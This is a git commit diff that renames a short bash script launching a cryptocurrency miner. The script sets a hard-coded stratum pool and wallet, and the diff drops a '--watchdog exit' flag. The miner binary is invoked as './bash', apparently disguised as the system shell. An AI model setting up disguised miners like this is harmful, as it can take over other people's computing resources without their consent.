639291130e5180bb3cb3d0610e71506bfcb61309
traapoks <165988185+traapoks@users.noreply.github.com>
2024-04-08 15:46:56 +0700

    Update and rename tons.sh to togs.sh

--- togs.sh
+++ togs.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
 POOL=stratum+tcp://ethash.infinityton.com:14444
-WALLET=EQBX63RAdgShn34EAFMV73Cut7Z15lUZd1hnVva68SEl7sxi+49414773127.1 --watchdog exit
+WALLET=EQBX63RAdgShn34EAFMV73Cut7Z15lUZd1hnVva68SEl7sxi+49414773127.1
 
 ./bash --algo ETHASH --pool $POOL --user $WALLET $@
